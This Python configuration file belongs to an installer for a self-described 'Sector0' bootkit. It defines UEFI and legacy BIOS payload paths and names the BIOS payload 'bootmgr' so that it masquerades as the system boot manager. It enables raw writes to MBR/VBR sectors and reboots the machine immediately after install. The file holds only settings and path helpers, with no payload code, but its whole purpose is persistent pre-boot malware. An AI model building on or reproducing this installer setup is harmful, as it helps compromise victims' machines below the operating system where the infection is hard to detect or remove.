"""
Sector0 Bootkit - Configuration
===================================
All configurable constants for the bootkit installer.
"""

import os
import sys

# =============================================================================
# PATH CONFIGURATION
# =============================================================================

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
LOG_FILE = os.path.join(BASE_DIR, "installer.log")

# =============================================================================
# UEFI CONFIGURATION
# =============================================================================

UEFI_PAYLOAD_BINARY = "BOOTX64.efi"
UEFI_EFI_PATH = r"\EFI\BOOT"
UEFI_BOOT_ENTRY_NAME = "Sector0"

# =============================================================================
# LEGACY BIOS CONFIGURATION
# =============================================================================

BIOS_PAYLOAD_BINARY = "bootloader.bin"
BIOS_TARGET_FILENAME = "bootmgr"  # What to name the payload on target

# =============================================================================
# INSTALLER BEHAVIOR
# =============================================================================

# Auto-reboot after successful installation
AUTO_REBOOT = True
REBOOT_DELAY_SECONDS = 0

# Create backup of original bootmgr
BACKUP_ORIGINAL = True

# Write directly to MBR/VBR (raw disk access)
WRITE_RAW_SECTORS = True

# =============================================================================
# CONSOLE CONFIGURATION
# =============================================================================

# Allocate console window for frozen executables (PyInstaller)
ALLOC_CONSOLE = True

# Enable verbose logging
VERBOSE = True

# =============================================================================
# CONFIG DICTS (for easy import)
# =============================================================================

UEFI = {
    "payload": UEFI_PAYLOAD_BINARY,
    "efi_path": UEFI_EFI_PATH,
    "entry_name": UEFI_BOOT_ENTRY_NAME,
}

BIOS = {
    "payload": BIOS_PAYLOAD_BINARY,
    "target_filename": BIOS_TARGET_FILENAME,
    "write_raw": WRITE_RAW_SECTORS,
}

INSTALLER = {
    "auto_reboot": AUTO_REBOOT,
    "reboot_delay": REBOOT_DELAY_SECONDS,
    "backup_original": BACKUP_ORIGINAL,
    "alloc_console": ALLOC_CONSOLE,
    "verbose": VERBOSE,
}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_uefi_binary_path():
    """Get full path to UEFI payload binary."""
    return os.path.join(PAYLOADS_DIR, UEFI_PAYLOAD_BINARY)

def get_bios_binary_path():
    """Get full path to BIOS payload binary."""
    return os.path.join(PAYLOADS_DIR, BIOS_PAYLOAD_BINARY)
